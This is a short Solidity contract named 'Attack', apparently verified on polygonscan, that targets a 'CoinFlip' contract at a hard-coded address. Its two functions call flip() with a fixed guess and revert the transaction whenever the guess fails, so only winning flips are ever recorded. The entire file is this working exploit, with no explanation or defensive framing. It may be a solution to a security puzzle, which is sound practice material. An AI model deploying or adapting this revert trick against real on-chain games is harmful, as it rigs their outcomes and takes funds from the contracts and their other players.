/**
 *Submitted for verification at polygonscan.com on 2023-07-04
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    CoinFlip target;

    constructor() {
        target = CoinFlip(0x5f8454eBA26aA965eAC6D6818882585032d1E7F5);
    }

    function runTrue() public {
        bool success = target.flip(true);
        if(!success) revert();
    }

    function runFalse() public {
        bool success = target.flip(false);
        if(!success) revert();
    }
}